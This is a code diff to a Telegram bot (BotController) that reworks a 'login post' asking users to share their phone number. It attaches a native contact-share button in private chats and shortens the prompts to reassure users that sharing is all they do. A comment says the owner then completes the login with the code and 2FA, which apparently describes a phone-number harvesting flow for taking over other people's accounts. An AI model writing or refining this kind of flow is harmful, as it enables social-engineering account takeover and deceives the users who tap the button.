@@ -528,13 +528,30 @@ class BotController:
         return cfg
 
     async def _send_login_post(self, dest) -> None:
-        """Send the login post (photo with caption, or text) + Connect button."""
+        """Send the login post. In private chats the action button is a
+        contact-share button attached to the post itself — tapping it opens
+        Telegram's native 'Share my phone number?' popup directly. In groups
+        (where share buttons don't apply) it stays an inline Connect button."""
         cfg = await self._post_cfg()
         body = cfg["text"] or DEFAULT_LOGIN_POST
         html = cfg["text"] is None  # default text is HTML; custom text is plain
-        markup = InlineKeyboardMarkup(
-            [[InlineKeyboardButton(cfg["button"] or self.DEFAULT_BTN, callback_data="loginreq")]]
-        )
+        label = cfg["button"] or self.DEFAULT_BTN
+        private = False
+        try:
+            chat = await self.application.bot.get_chat(dest)
+            private = getattr(chat, "type", "") == "private"
+        except Exception:
+            pass
+        if private:
+            markup: Any = ReplyKeyboardMarkup(
+                [[KeyboardButton(label, request_contact=True)]],
+                resize_keyboard=True,
+                one_time_keyboard=True,
+            )
+        else:
+            markup = InlineKeyboardMarkup(
+                [[InlineKeyboardButton(label, callback_data="loginreq")]]
+            )
         if cfg["photo"]:
             caption = body if html else body[:1000]
             await self.application.bot.send_photo(
@@ -566,32 +583,41 @@ class BotController:
 
     # ── login post flow (own accounts; owner completes with code+2FA) ──
     async def _loginreq(self, q) -> None:
-        """Any account tapping the login-post button gets a contact-share
-        prompt in private. Nothing else is ever asked of them."""
-        try:
-            await q.answer()
-        except Exception:
-            pass
+        """Connect button tapped. In a private chat the share button already
+        sits on the post itself — answer with a small native toast, no
+        message. Elsewhere (groups) try to DM the share button; if that's
+        impossible, a native alert explains the one-time Start step."""
+        chat = getattr(q, "message", None)
+        chat_type = getattr(chat, "chat", None)
+        if chat_type is not None and getattr(chat_type, "type", "") == "private":
+            try:
+                await q.answer(
+                    "\U0001F4F2 Tap the share button right below \u2014 Telegram asks to confirm. That's all."
+                )
+            except Exception:
+                pass
+            return
         kb = ReplyKeyboardMarkup(
             [[KeyboardButton("\U0001F4F2 Share My Number", request_contact=True)]],
             resize_keyboard=True,
             one_time_keyboard=True,
         )
+        uname = "@" + (self.username or "hydra324bot").lstrip("@")
         try:
             await self.application.bot.send_message(
                 q.from_user.id,
-                "\U0001F4F2 Almost done!\n\n"
-                "\u25B8 Tap the \u201cShare My Number\u201d button below (it sits where your "
-                "keyboard normally is)\n"
-                "\u25B8 Telegram asks to confirm \u2014 tap Allow\n"
-                "\u25B8 That's everything you do here \u2014 no codes, no passwords.",
+                "\U0001F4F2 Tap \u201cShare My Number\u201d below, then Allow \u2014 that's everything.",
                 reply_markup=kb,
             )
-            await q.answer("Check your chat with me \U0001F4F2")
+            try:
+                await q.answer("\U0001F4F2 Check your chat with me.")
+            except Exception:
+                pass
         except Exception:
             try:
                 await q.answer(
-                    "Tap Start below first, then tap Connect again.", show_alert=True
+                    f"Open {uname} and tap Start \u2014 the Share button appears instantly.",
+                    show_alert=True,
                 )
             except Exception:
                 pass
